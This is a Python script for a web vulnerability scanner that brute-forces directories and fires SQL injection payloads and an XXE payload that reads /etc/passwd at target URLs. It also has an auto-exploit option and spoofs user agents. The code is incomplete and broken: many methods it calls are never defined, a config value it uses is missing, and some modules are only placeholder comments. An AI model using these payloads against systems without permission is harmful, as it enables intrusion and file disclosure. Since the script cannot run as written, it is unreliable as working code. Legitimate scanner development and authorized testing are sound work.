import requests
import argparse
import threading
import queue
import time
import json
import os
import re
import sys
from urllib.parse import urljoin, urlparse, quote
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from fake_useragent import UserAgent

# Suppress SSL warnings (for demo only - not recommended for production)
requests.packages.urllib3.disable_warnings()

class UltimateScanner:
    def __init__(self, config):
        self.config = config
        self.session = requests.Session()
        self.ua = UserAgent()
        self.cve_db = self.load_cve_database()
        self.vulnerabilities = []
        self.scan_stats = {
            "start_time": time.time(),
            "requests_sent": 0,
            "vulnerabilities_found": 0
        }
        self.setup_session()

    def setup_session(self):
        """Configure HTTP session with headers and proxies"""
        self.session.headers.update({
            "User-Agent": self.ua.random,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "X-Scanner": "UltimateWebScanner/1.0"
        })
        if self.config.proxy:
            self.session.proxies = {"http": self.config.proxy, "https": self.config.proxy}
        self.session.verify = False  # For demo only!

    def load_cve_database(self):
        """Load CVE database for version-based checks"""
        try:
            with open("cve_db.json") as f:
                return json.load(f)
        except:
            return {}  # Fallback if no DB

    def scan(self, url):
        """Master control for all scan modules"""
        print(f"[*] Scanning {url} with {self.config.threads} threads...")
        
        # Phase 1: Reconnaissance
        self.fingerprint_tech(url)
        self.check_cloud_misconfigs(url)
        
        # Phase 2: Automated Testing
        modules = [
            self.bruteforce_directories,
            self.test_sql_injection,
            self.test_xss,
            self.test_lfi_rfi,
            self.test_xxe,
            self.test_ssrf,
            self.test_api_endpoints,
            self.test_cors_misconfig,
            self.test_jwt_issues,
            self.test_graphql
        ]
        
        with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            futures = [executor.submit(mod, url) for mod in modules]
            for future in futures:
                future.result()  # Wait for completion

        # Phase 3: Post-exploitation analysis
        if self.config.auto_exploit:
            self.attempt_auto_exploit(url)
        
        self.generate_report(url)

    # ----------------------
    # SCANNER MODULES BELOW
    # ----------------------

    def fingerprint_tech(self, url):
        """Detect technologies using headers, cookies, and page content"""
        res = self.request(url)
        if not res: return
        
        tech = {
            "server": res.headers.get("Server", ""),
            "x_powered_by": res.headers.get("X-Powered-By", ""),
            "cookies": list(res.cookies.keys()),
            "framework": self.detect_framework(res.text)
        }
        
        # Check for vulnerable versions
        for cve in self.cve_db:
            if cve["tech"] in tech["server"] or cve["tech"] in tech["x_powered_by"]:
                if self.compare_versions(tech["server"], cve["vulnerable_versions"]):
                    self.log_vuln(
                        "CVE-" + cve["id"],
                        url,
                        f"Vulnerable {cve['tech']} version detected ({tech['server']})",
                        "High",
                        f"CVE-{cve['id']}: {cve['description']}"
                    )

    def bruteforce_directories(self, url):
        """Brute-force common directories and admin panels"""
        with open("wordlists/common_dirs.txt") as f:
            dirs = [d.strip() for d in f.readlines()]
        
        with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            futures = []
            for directory in dirs:
                target = urljoin(url, directory)
                futures.append(executor.submit(self.check_dir, target))
            
            for future in futures:
                result = future.result()
                if result:
                    self.log_vuln("Directory Exposure", result["url"], result["msg"], result["severity"])

    def test_sql_injection(self, url):
        """Advanced SQLi testing with time-based and boolean techniques"""
        payloads = [
            "' OR '1'='1",
            "' OR SLEEP(5)--",
            "1 AND (SELECT * FROM (SELECT(SLEEP(5)))abc)",
            "1; SELECT PG_SLEEP(5)--"
        ]
        
        # Find all parameters
        params = self.extract_parameters(url)
        
        for param, value in params.items():
            for payload in payloads:
                start_time = time.time()
                test_url = url.replace(f"{param}={value}", f"{param}={payload}")
                res = self.request(test_url)
                if not res: continue
                
                # Time-based detection
                if time.time() - start_time > 5:
                    self.log_vuln(
                        "SQL Injection (Time-Based)",
                        test_url,
                        f"Time delay detected with payload: {payload}",
                        "Critical",
                        f"5+ second response delay on parameter: {param}"
                    )
                
                # Error-based detection
                if any(err in res.text.lower() for err in ["syntax error", "mysql", "ora-"]):
                    self.log_vuln(
                        "SQL Injection (Error-Based)",
                        test_url,
                        f"Database error with payload: {payload}",
                        "Critical",
                        f"Error in parameter: {param}"
                    )

    def test_xxe(self, url):
        """Test for XML External Entity processing"""
        xxe_payload = """<?xml version="1.0"?>
        <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
        <foo>&xxe;</foo>"""
        
        headers = {"Content-Type": "application/xml"}
        res = self.request(url, method="POST", data=xxe_payload, headers=headers)
        
        if res and ("root:" in res.text or "[boot loader]" in res.text):
            self.log_vuln(
                "XXE Injection",
                url,
                "XML External Entity processing enabled",
                "Critical",
                f"File disclosure via XXE: {res.text[:200]}..."
            )

    # [Additional modules...]
    # (Would include test_lfi_rfi(), test_ssrf(), test_api_endpoints(), etc.)

    # ----------------------
    # UTILITY FUNCTIONS
    # ----------------------

    def request(self, url, method="GET", **kwargs):
        """Wrapper for HTTP requests with error handling"""
        try:
            self.scan_stats["requests_sent"] += 1
            if method.upper() == "GET":
                return self.session.get(url, timeout=self.config.timeout, **kwargs)
            elif method.upper() == "POST":
                return self.session.post(url, timeout=self.config.timeout, **kwargs)
        except Exception as e:
            if self.config.verbose:
                print(f"[-] Request failed: {str(e)}")
            return None

    def log_vuln(self, category, url, description, severity, proof=None):
        """Record discovered vulnerabilities"""
        vuln = {
            "category": category,
            "url": url,
            "description": description,
            "severity": severity,
            "proof": proof,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        self.vulnerabilities.append(vuln)
        self.scan_stats["vulnerabilities_found"] += 1
        
        # Print critical findings immediately
        if severity in ["Critical", "High"]:
            print(f"[!] {severity.upper()} FOUND: {category} at {url}")

    def generate_report(self, url):
        """Generate professional JSON and HTML reports"""
        report = {
            "target": url,
            "scan_config": vars(self.config),
            "statistics": {
                "duration_sec": round(time.time() - self.scan_stats["start_time"], 2),
                "requests_sent": self.scan_stats["requests_sent"],
                "vulnerabilities_found": self.scan_stats["vulnerabilities_found"]
            },
            "findings": self.vulnerabilities
        }
        
        # Save JSON report
        with open(f"scan_report_{urlparse(url).netloc}.json", "w") as f:
            json.dump(report, f, indent=2)
        
        # Generate HTML report
        self.generate_html_report(report)
        
        print(f"\n[+] Scan complete! Report saved for {url}")

    def generate_html_report(self, data):
        """Generate visual HTML report"""
        # [Implementation would go here]
        pass

def main():
    parser = argparse.ArgumentParser(description="Ultimate Web Vulnerability Scanner")
    parser.add_argument("target", help="URL or file containing URLs to scan")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Scanning threads")
    parser.add_argument("-x", "--proxy", help="Proxy server (e.g., http://127.0.0.1:8080)")
    parser.add_argument("-a", "--auto-exploit", action="store_true", help="Attempt auto-exploitation")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    args = parser.parse_args()

    scanner = UltimateScanner(args)
    
    if os.path.isfile(args.target):
        with open(args.target) as f:
            for url in f.readlines():
                scanner.scan(url.strip())
    else:
        scanner.scan(args.target)

if __name__ == "__main__":
    banner = """
    ██╗   ██╗██╗  ██╗██████╗ ██╗   ██╗██╗   ██╗
    ██║   ██║██║  ██║██╔══██╗██║   ██║██║   ██║
    ██║   ██║███████║██████╔╝██║   ██║██║   ██║
    ██║   ██║╚════██║██╔═══╝ ██║   ██║██║   ██║
    ╚██████╔╝     ██║██║     ╚██████╔╝╚██████╔╝
     ╚═════╝      ╚═╝╚═╝      ╚═════╝  ╚═════╝ 
    """
    print(banner)
    main()
